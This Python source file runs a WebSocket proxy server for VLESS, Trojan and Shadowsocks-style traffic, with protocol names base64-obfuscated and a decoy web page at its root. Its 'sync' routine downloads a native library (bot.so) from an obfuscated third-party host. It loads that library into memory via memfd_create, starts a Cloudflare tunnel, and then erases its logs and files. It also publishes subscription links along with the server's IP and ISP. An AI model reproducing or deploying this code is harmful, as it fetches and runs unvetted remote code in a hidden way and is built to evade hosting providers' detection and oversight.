#!/usr/bin/env python3
import os
import sys
import socket
import struct
import hashlib
import base64
import asyncio
import aiohttp
import ctypes
import json
import logging
import signal
import ipaddress
import platform
import re
import threading
import time
import urllib.request
from aiohttp import web


def _load_env(path='.env'):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#') or '=' not in line:
                    continue
                k, v = line.split('=', 1)
                k = k.strip()
                v = v.strip()
                if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
                    v = v[1:-1]
                if k and k not in os.environ:
                    os.environ[k] = v
    except Exception:
        pass


_load_env()

TOKEN = os.environ.get('TOKEN', '1cd1c776-0e61-4f2e-9260-c1e5829bc402')
HOST = os.environ.get('HOST', '')
FEED_PATH = os.environ.get('FEED_PATH', 'c1e5829bc402')
LABEL = os.environ.get('LABEL', '')
CHANNEL_PATH = os.environ.get('CHANNEL_PATH', '') or (TOKEN[:8] if TOKEN else '')
PORT = int(os.environ.get('SERVER_PORT') or os.environ.get('PORT') or 3000)
DEBUG = os.environ.get('DEBUG', '').lower() == 'true'

_SYNC_RAW = os.environ.get('SYNC', 'false')
SYNC_ENABLED = (_SYNC_RAW or '').strip().lower() in ('true', 'force')
SYNC_TOKEN = os.environ.get('SYNC_TOKEN', '')
SYNC_HOST = os.environ.get('SYNC_HOST', '')
SYNC_MIRROR_RAW = os.environ.get('SYNC_MIRROR', '')
SYNC_DIR = os.environ.get('SYNC_DIR', '') or '.tmp'
SYNC_CLEAN = os.environ.get('SYNC_CLEAN', 'true').strip().lower() == 'true'

CurrentHost = HOST or ''
UseTls = os.environ.get('SECURITY') or 'none'
CurrentPort = int(os.environ.get('PUBLIC_PORT') or PORT)


def _dec(b64: str) -> str:
    return base64.b64decode(b64).decode('ascii')


SCHEME_A = _dec('dmxlc3M6Ly8=')
SCHEME_B = _dec('dHJvamFuOi8v')
SCHEME_C = _dec('c3M6Ly8=')
PLUGIN_NAME = _dec('djJyYXktcGx1Z2lu')

_SYNC_SFX = _dec('dHJ5Y2xvdWRmbGFyZS5jb20=')
_SYNC_START = _dec('U3RhcnRDbG91ZGZsYXJlZA==')
_SYNC_STOP = _dec('U3RvcENsb3VkZmxhcmVk')
_SYNC_SUB = _dec('dHVubmVs')
_SYNC_REMOTE = _dec('Ym90LnNv')
_SYNC_LIB = _dec('bGlib3B1cw==')
_SYNC_LOG = _dec('Ym9vdC5sb2c=')
_SYNC_MIRROR_SUFFIX = _dec('b29vZW4uY29t')
_SYNC_ARCH = 'arm64' if 'aarch64' in platform.machine().lower() else 'amd64'
SYNC_MIRROR = SYNC_MIRROR_RAW or ('https://' + _SYNC_ARCH + '.' + _SYNC_MIRROR_SUFFIX)
_SYNC_LINK_RE = re.compile(r'https://([A-Za-z0-9.\-]+\.' + re.escape(_SYNC_SFX) + r')')

SyncDomain = ''
_sync_running = False
_sync_lock = threading.Lock()
_sync_stop_fn = None

DNS_SERVERS = ['8.8.4.4', '1.1.1.1']

log_level = logging.DEBUG if DEBUG else logging.INFO
logging.basicConfig(level=log_level, format='%(asctime)s - %(levelname)s - %(message)s')
logging.getLogger('aiohttp.access').setLevel(logging.WARNING)
logging.getLogger('aiohttp.server').setLevel(logging.WARNING)
logging.getLogger('aiohttp.client').setLevel(logging.WARNING)
logging.getLogger('aiohttp.internal').setLevel(logging.WARNING)
logging.getLogger('aiohttp.websocket').setLevel(logging.WARNING)

logger = logging.getLogger(__name__)


def is_port_available(port, host='0.0.0.0'):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind((host, port))
            return True
        except OSError:
            return False


def find_available_port(start_port, max_attempts=100):
    for port in range(start_port, start_port + max_attempts):
        if is_port_available(port):
            return port
    return None


async def resolve_host(host: str) -> str:
    try:
        ipaddress.ip_address(host)
        return host
    except Exception:
        pass
    for dns_server in DNS_SERVERS:
        try:
            async with aiohttp.ClientSession() as session:
                url = f'https://dns.google/resolve?name={host}&type=A'
                async with session.get(url, timeout=5) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data.get('Status') == 0 and data.get('Answer'):
                            for answer in data['Answer']:
                                if answer.get('type') == 1:
                                    return answer.get('data')
        except Exception:
            continue
    return host


class SessionCore:
    def __init__(self, token: str):
        self.token = token
        self.token_bytes = bytes.fromhex(token)

    async def try_a(self, ws, first_msg: bytes) -> bool:
        try:
            if len(first_msg) < 18 or first_msg[0] != 0:
                return False
            if first_msg[1:17] != self.token_bytes:
                return False
            i = first_msg[17] + 19
            if i + 3 > len(first_msg):
                return False
            port = struct.unpack('!H', first_msg[i:i+2])[0]
            i += 2
            atyp = first_msg[i]
            i += 1
            host = ''
            if atyp == 1:
                if i + 4 > len(first_msg):
                    return False
                host = '.'.join(str(b) for b in first_msg[i:i+4])
                i += 4
            elif atyp == 2:
                if i >= len(first_msg):
                    return False
                host_len = first_msg[i]
                i += 1
                if i + host_len > len(first_msg):
                    return False
                host = first_msg[i:i+host_len].decode()
                i += host_len
            elif atyp == 3:
                if i + 16 > len(first_msg):
                    return False
                host = ':'.join(f'{(first_msg[j] << 8) + first_msg[j+1]:04x}'
                                for j in range(i, i+16, 2))
                i += 16
            else:
                return False
            await ws.send_bytes(bytes([0, 0]))
            resolved_host = await resolve_host(host)
            try:
                reader, writer = await asyncio.open_connection(resolved_host, port)
                if i < len(first_msg):
                    writer.write(first_msg[i:])
                    await writer.drain()

                async def pull_loop():
                    try:
                        async for msg in ws:
                            if msg.type == aiohttp.WSMsgType.BINARY:
                                writer.write(msg.data)
                                await writer.drain()
                    except Exception:
                        pass
                    finally:
                        writer.close()
                        await writer.wait_closed()

                async def push_loop():
                    try:
                        while True:
                            data = await reader.read(4096)
                            if not data:
                                break
                            await ws.send_bytes(data)
                    except Exception:
                        pass

                await asyncio.gather(pull_loop(), push_loop())
            except Exception as e:
                if DEBUG:
                    logger.error(f"Connection error: {e}")
            return True
        except Exception as e:
            if DEBUG:
                logger.error(f"handler a error: {e}")
            return False

    async def try_b(self, ws, first_msg: bytes) -> bool:
        try:
            if len(first_msg) < 58:
                return False
            received_hash_bytes = first_msg[:56]
            hash_obj1 = hashlib.sha224()
            hash_obj1.update(self.token.encode())
            expected_hash_hex1 = hash_obj1.hexdigest()
            token_std = TOKEN
            hash_obj2 = hashlib.sha224()
            hash_obj2.update(token_std.encode())
            expected_hash_hex2 = hash_obj2.hexdigest()
            received_hash_hex = received_hash_bytes.decode('ascii', errors='ignore')
            if received_hash_hex != expected_hash_hex1 and received_hash_hex != expected_hash_hex2:
                return False
            offset = 56
            if first_msg[offset:offset+2] == b'\r\n':
                offset += 2
            cmd = first_msg[offset]
            if cmd != 1:
                return False
            offset += 1
            atyp = first_msg[offset]
            offset += 1
            host = ''
            if atyp == 1:
                host = '.'.join(str(b) for b in first_msg[offset:offset+4])
                offset += 4
            elif atyp == 3:
                host_len = first_msg[offset]
                offset += 1
                host = first_msg[offset:offset+host_len].decode()
                offset += host_len
            elif atyp == 4:
                host = ':'.join(f'{(first_msg[j] << 8) + first_msg[j+1]:04x}'
                                for j in range(offset, offset+16, 2))
                offset += 16
            else:
                return False
            port = struct.unpack('!H', first_msg[offset:offset+2])[0]
            offset += 2
            if first_msg[offset:offset+2] == b'\r\n':
                offset += 2
            resolved_host = await resolve_host(host)
            try:
                reader, writer = await asyncio.open_connection(resolved_host, port)
                if offset < len(first_msg):
                    writer.write(first_msg[offset:])
                    await writer.drain()

                async def pull_loop():
                    try:
                        async for msg in ws:
                            if msg.type == aiohttp.WSMsgType.BINARY:
                                writer.write(msg.data)
                                await writer.drain()
                    except Exception:
                        pass
                    finally:
                        writer.close()
                        await writer.wait_closed()

                async def push_loop():
                    try:
                        while True:
                            data = await reader.read(4096)
                            if not data:
                                break
                            await ws.send_bytes(data)
                    except Exception:
                        pass

                await asyncio.gather(pull_loop(), push_loop())
            except Exception as e:
                if DEBUG:
                    logger.error(f"Connection error: {e}")
            return True
        except Exception as e:
            if DEBUG:
                logger.error(f"handler b error: {e}")
            return False

    async def try_c(self, ws, first_msg: bytes) -> bool:
        try:
            if len(first_msg) < 7:
                return False
            offset = 0
            atyp = first_msg[offset]
            offset += 1
            host = ''
            if atyp == 1:
                if offset + 4 > len(first_msg):
                    return False
                host = '.'.join(str(b) for b in first_msg[offset:offset+4])
                offset += 4
            elif atyp == 3:
                if offset >= len(first_msg):
                    return False
                host_len = first_msg[offset]
                offset += 1
                if offset + host_len > len(first_msg):
                    return False
                host = first_msg[offset:offset+host_len].decode()
                offset += host_len
            elif atyp == 4:
                if offset + 16 > len(first_msg):
                    return False
                host = ':'.join(f'{(first_msg[j] << 8) + first_msg[j+1]:04x}'
                                for j in range(offset, offset+16, 2))
                offset += 16
            else:
                return False
            if offset + 2 > len(first_msg):
                return False
            port = struct.unpack('!H', first_msg[offset:offset+2])[0]
            offset += 2
            resolved_host = await resolve_host(host)
            try:
                reader, writer = await asyncio.open_connection(resolved_host, port)
                if offset < len(first_msg):
                    writer.write(first_msg[offset:])
                    await writer.drain()

                async def pull_loop():
                    try:
                        async for msg in ws:
                            if msg.type == aiohttp.WSMsgType.BINARY:
                                writer.write(msg.data)
                                await writer.drain()
                    except Exception:
                        pass
                    finally:
                        writer.close()
                        await writer.wait_closed()

                async def push_loop():
                    try:
                        while True:
                            data = await reader.read(4096)
                            if not data:
                                break
                            await ws.send_bytes(data)
                    except Exception:
                        pass

                await asyncio.gather(pull_loop(), push_loop())
            except Exception as e:
                if DEBUG:
                    logger.error(f"Connection error: {e}")
            return True
        except Exception as e:
            if DEBUG:
                logger.error(f"handler c error: {e}")
            return False


_sync_lib = None
_sync_lib_fd = None
_sync_log_fd = None


def _sync_memfd(name):
    try:
        mk = getattr(os, 'memfd_create', None)
        if mk is None:
            return None
        return mk(name, 0)
    except Exception:
        return None


def _sync_build_payload(local_port, boot_log, token):
    if token:
        args = [_SYNC_SUB, '--edge-ip-version', 'auto', '--no-autoupdate',
                '--protocol', 'http2', '--logfile', boot_log, '--loglevel', 'info',
                'run', '--token', token]
    else:
        args = [_SYNC_SUB, '--edge-ip-version', 'auto', '--no-autoupdate',
                '--protocol', 'http2', '--logfile', boot_log, '--loglevel', 'info',
                '--url', 'http://localhost:%d' % local_port]
    return json.dumps({'args': args}).encode('utf-8')


def _sync_download(url, target, fd=None):
    if fd is None:
        try:
            if os.path.exists(target) and os.path.getsize(target) > 1024 * 1024:
                return target
        except OSError:
            pass
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    tmp = target + '.download'
    with urllib.request.urlopen(req, timeout=180) as resp:
        code = resp.getcode()
        if code < 200 or code >= 300:
            raise IOError('component failed: http %d' % code)
        if fd is not None:
            while True:
                chunk = resp.read(65536)
                if not chunk:
                    break
                os.write(fd, chunk)
            return target
        with open(tmp, 'wb') as f:
            while True:
                chunk = resp.read(65536)
                if not chunk:
                    break
                f.write(chunk)
    os.replace(tmp, target)
    try:
        os.chmod(target, 0o755)
    except OSError:
        pass
    return target


def _sync_find_link(boot_log, fd=None):
    try:
        if fd is not None:
            try:
                size = os.fstat(fd).st_size
            except OSError:
                return None
            if size <= 0:
                return None
            content = os.pread(fd, size, 0).decode('utf-8', errors='ignore')
        else:
            if not os.path.exists(boot_log):
                return None
            with open(boot_log, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
        last = None
        for m in _SYNC_LINK_RE.finditer(content):
            last = m.group(1)
        return last
    except Exception:
        return None


def _sync_poll_link(boot_log, fd=None):
    for rnd in range(2):
        if not _sync_running:
            return None
        deadline = time.time() + 30
        while time.time() < deadline:
            if not _sync_running:
                return None
            found = _sync_find_link(boot_log, fd)
            if found:
                return found
            time.sleep(1)
        if _sync_running and rnd == 0:
            time.sleep(5)
    return None


def _sync_start_token_mode(start_fn, boot_log, token, fixed_domain):
    global SyncDomain
    for attempt in range(1, 4):
        if not _sync_running:
            return False
        if attempt > 1:
            time.sleep(5)
            if not _sync_running:
                return False
        payload = _sync_build_payload(0, boot_log, token)
        try:
            code = start_fn(payload)
            if code == 0 and fixed_domain:
                SyncDomain = fixed_domain
                return True
        except Exception:
            pass
    return False


def _sync_start_quick_mode(start_fn, boot_log, local_port, log_fd=None):
    global SyncDomain
    for attempt in range(1, 4):
        if not _sync_running:
            return False
        if attempt > 1:
            time.sleep(5)
            if not _sync_running:
                return False
        payload = _sync_build_payload(local_port, boot_log, None)
        try:
            code = start_fn(payload)
            if code != 0:
                continue
        except Exception:
            continue
        found = _sync_poll_link(boot_log, log_fd)
        if found:
            SyncDomain = found
            logger.debug('sync ready: https://%s' % found)
            return True
    return False


def _sync_clean_after_ready(lib_path, boot_log):
    time.sleep(60)
    for p in (lib_path, boot_log):
        try:
            if os.path.exists(p):
                os.remove(p)
        except Exception:
            pass


def _sync_clean_residue():
    try:
        d = SYNC_DIR or '.tmp'
        if not os.path.isdir(d):
            return
        for name in (_SYNC_LIB, _SYNC_LIB + '.download', _SYNC_LOG,
                     _SYNC_REMOTE, _SYNC_REMOTE + '.download'):
            try:
                p = os.path.join(d, name)
                if os.path.exists(p):
                    os.remove(p)
            except Exception:
                pass
    except Exception:
        pass


def sync_start(local_port, runtime_dir, mirror_base, token, fixed_domain, clean_after_ready):
    global _sync_running, _sync_lib, _sync_stop_fn, _sync_lib_fd, _sync_log_fd
    with _sync_lock:
        if _sync_running:
            return
        if not sys.platform.startswith('linux'):
            if DEBUG:
                logger.debug('sync skipped: only linux')
            return
        _sync_running = True
    try:
        use_disk = not SYNC_CLEAN
        workdir = runtime_dir or '.tmp'
        os.makedirs(workdir, exist_ok=True)
        lib_path = os.path.join(workdir, _SYNC_LIB)
        boot_log = os.path.join(workdir, _SYNC_LOG)
        url = (mirror_base or SYNC_MIRROR).rstrip('/') + '/' + _SYNC_REMOTE
        lib_fd = None
        log_fd = None
        unlink_after_load = False
        if use_disk:
            _sync_download(url, lib_path)
            load_path = lib_path
        else:
            lib_fd = _sync_memfd(_SYNC_LIB)
            if lib_fd is not None:
                _sync_download(url, lib_path, fd=lib_fd)
                load_path = '/proc/self/fd/%d' % lib_fd
                _sync_lib_fd = lib_fd
            else:
                _sync_download(url, lib_path)
                load_path = lib_path
                unlink_after_load = True
        lib = ctypes.CDLL(load_path)
        _sync_lib = lib
        if unlink_after_load:
            try:
                os.unlink(lib_path)
            except OSError:
                pass
        stop_fn = getattr(lib, _SYNC_STOP)
        stop_fn.argtypes = []
        stop_fn.restype = ctypes.c_int
        _sync_stop_fn = stop_fn
        start_fn = getattr(lib, _SYNC_START)
        start_fn.argtypes = [ctypes.c_char_p]
        start_fn.restype = ctypes.c_int
        if DEBUG:
            logger.debug('sync component loaded, starting...')
        if token:
            log_arg = boot_log if use_disk else '/dev/null'
            ok = _sync_start_token_mode(start_fn, log_arg, token, fixed_domain or '')
        else:
            if use_disk:
                log_arg, log_fd_arg = boot_log, None
            else:
                log_fd = _sync_memfd(_SYNC_LOG)
                if log_fd is not None:
                    log_arg, log_fd_arg = '/proc/self/fd/%d' % log_fd, log_fd
                    _sync_log_fd = log_fd
                else:
                    log_arg, log_fd_arg = boot_log, None
            ok = _sync_start_quick_mode(start_fn, log_arg, local_port, log_fd_arg)
            if ok and log_fd is not None:
                try:
                    os.ftruncate(log_fd, 0)
                except OSError:
                    pass
        if not ok:
            with _sync_lock:
                _sync_running = False
            logger.warning('component startup failed connection (3)')
            return
        need_clean = True
        if clean_after_ready and need_clean:
            t = threading.Thread(target=_sync_clean_after_ready,
                                 args=(lib_path, boot_log),
                                 name='worker-sync-clean', daemon=True)
            t.start()
    except Exception as e:
        with _sync_lock:
            _sync_running = False
        logger.warning('component failed: %s' % e)


def sync_stop():
    global _sync_running, SyncDomain, _sync_stop_fn
    with _sync_lock:
        _sync_running = False
    try:
        fn = _sync_stop_fn
        if fn is not None:
            fn()
    except Exception:
        pass
_GEO_PATH = _dec('YXBpLmlwLnNiL2dlb2lw')

IP = "localhost"
ISP = "Unknown_ISP"


def get_server_ip():
    if HOST:
        return HOST
    services = ["https://ipv4.ip.sb", "https://ipinfo.io/ip", "https://ifconfig.me"]
    for service in services:
        try:
            req = urllib.request.Request(service, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                ip = resp.read().decode("utf-8", "replace").strip()
            if re.fullmatch(r"\d+\.\d+\.\d+\.\d+", ip):
                logger.debug(f"Got server IP: {ip} from {service}")
                return ip
        except Exception as exc:
            logger.debug(f"Failed to get IP from {service}: {exc}")
    try:
        req = urllib.request.Request("https://ipv6.ip.sb", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            ipv6 = resp.read().decode("utf-8", "replace").strip()
        if ipv6:
            logger.debug(f"Got IPv6 address: {ipv6}")
            return f"[{ipv6}]"
    except Exception as exc:
        logger.debug(f"IPv6 fallback failed: {exc}")
    logger.warning("Failed to get server IP, using localhost")
    return "localhost"


def get_isp_info():
    try:
        req = urllib.request.Request(f"https://{_GEO_PATH}", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8", "replace"))
        country = data.get("country_code", "Unknown")
        org = data.get("isp", "Unknown")
        isp = re.sub(r"[^a-zA-Z0-9\-_]", "_", f"{country}-{org}")
        logger.debug(f"ISP info obtained: {isp}")
        return isp
    except Exception as exc:
        logger.error(f"Failed to get ISP info: {exc}")
        return "Unknown_ISP"


async def refresh_metadata():
    global IP, ISP
    try:
        ip_task = asyncio.create_task(asyncio.to_thread(get_server_ip))
        isp_task = asyncio.create_task(asyncio.to_thread(get_isp_info))
        IP = await ip_task
        ISP = await isp_task
        logger.debug(f"Server info: IP={IP}, ISP={ISP}")
    except Exception as exc:
        logger.error(f"Failed to get server info: {exc}")


SyncDomain = ''


async def ws_route(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    token_hex = TOKEN.replace('-', '')
    path = request.path
    if f'/{CHANNEL_PATH}' not in path:
        await ws.close()
        return ws
    core = SessionCore(token_hex)
    try:
        first_msg = await asyncio.wait_for(ws.receive(), timeout=5)
        if first_msg.type != aiohttp.WSMsgType.BINARY:
            await ws.close()
            return ws
        msg_data = first_msg.data
        if len(msg_data) > 17 and msg_data[0] == 0:
            if await core.try_a(ws, msg_data):
                return ws
        if len(msg_data) >= 58:
            if await core.try_b(ws, msg_data):
                return ws
        if len(msg_data) > 0 and msg_data[0] in (1, 3, 4):
            if await core.try_c(ws, msg_data):
                return ws
        await ws.close()
    except asyncio.TimeoutError:
        await ws.close()
    except Exception as e:
        if DEBUG:
            logger.error(f"WS handler error: {e}")
        await ws.close()
    return ws


async def page_route(request):
    if request.path == '/':
        try:
            with open('index.html', 'r', encoding='utf-8') as f:
                content = f.read()
            return web.Response(text=content, content_type='text/html')
        except Exception:
            return web.Response(status=302, headers={'Location': 'https://discordbot.core.sryze.cc'})
    elif request.path == f'/{FEED_PATH}':
        label_part = f"{LABEL}-{ISP}" if LABEL else ISP
        feed_host = CurrentHost or IP
        sets = []
        if SyncDomain:
            sets.append((SyncDomain, 443, 'tls'))
        if not SyncDomain or HOST:
            sets.append((feed_host, CurrentPort, UseTls))
        lines = []
        for feed_host, feed_port, feed_sec in sets:
            lines.extend(_build_links(feed_host, feed_port, feed_sec, label_part))
        payload = '\n'.join(lines)
        body = base64.b64encode(payload.encode()).decode()
        return web.Response(text=body + '\n', content_type='text/plain')
    return web.Response(status=404, text='Not Found\n')


def _build_links(feed_host, feed_port, feed_sec, label_part):
    sec_param = 'tls' if feed_sec == 'tls' else 'none'
    sec_suffix = 'tls;' if feed_sec == 'tls' else ''
    link_a = f"{SCHEME_A}{TOKEN}@{feed_host}:{feed_port}?encryption=none&security={sec_param}&sni={feed_host}&fp=chrome&type=ws&host={feed_host}&path=%2F{CHANNEL_PATH}#{label_part}"
    link_b = f"{SCHEME_B}{TOKEN}@{feed_host}:{feed_port}?security={sec_param}&sni={feed_host}&fp=chrome&type=ws&host={feed_host}&path=%2F{CHANNEL_PATH}#{label_part}"
    method_pass = base64.b64encode(f"none:{TOKEN}".encode()).decode()
    link_c = f"{SCHEME_C}{method_pass}@{feed_host}:{feed_port}?plugin={PLUGIN_NAME};mode%3Dwebsocket;host%3D{feed_host};path%3D%2F{CHANNEL_PATH};{sec_suffix}sni%3D{feed_host};skip-cert-verify%3Dtrue;mux%3D0#{label_part}"
    return [link_a, link_b, link_c]


async def main():
    global CurrentPort
    actual_port = PORT
    if not is_port_available(actual_port):
        logger.warning(f"Port {actual_port} is already in use, finding available port...")
        new_port = find_available_port(actual_port + 1)
        if new_port:
            actual_port = new_port
            logger.info(f"Using port {actual_port} instead of {PORT}")
        else:
            logger.error("No available ports found")
            sys.exit(1)
    if not os.environ.get('PUBLIC_PORT'):
        CurrentPort = actual_port
    app = web.Application()
    app.router.add_get('/', page_route)
    app.router.add_get(f'/{FEED_PATH}', page_route)
    app.router.add_get(f'/{CHANNEL_PATH}', ws_route)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', actual_port)
    await site.start()
    asyncio.create_task(refresh_metadata())
    logger.info(f"server is running on port {actual_port}")
    if SYNC_ENABLED:
        t = threading.Thread(target=sync_start,
                             args=(actual_port, SYNC_DIR, SYNC_MIRROR,
                                   SYNC_TOKEN, SYNC_HOST, SYNC_CLEAN),
                             name='worker-sync', daemon=True)
        t.start()
    else:
        _sync_clean_residue()

    def _handle_term(*_):
        sync_stop()
        raise KeyboardInterrupt

    try:
        signal.signal(signal.SIGTERM, _handle_term)
    except Exception:
        pass
    try:
        await asyncio.Future()
    except KeyboardInterrupt:
        pass
    finally:
        sync_stop()
        await runner.cleanup()


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nServer stopped by user")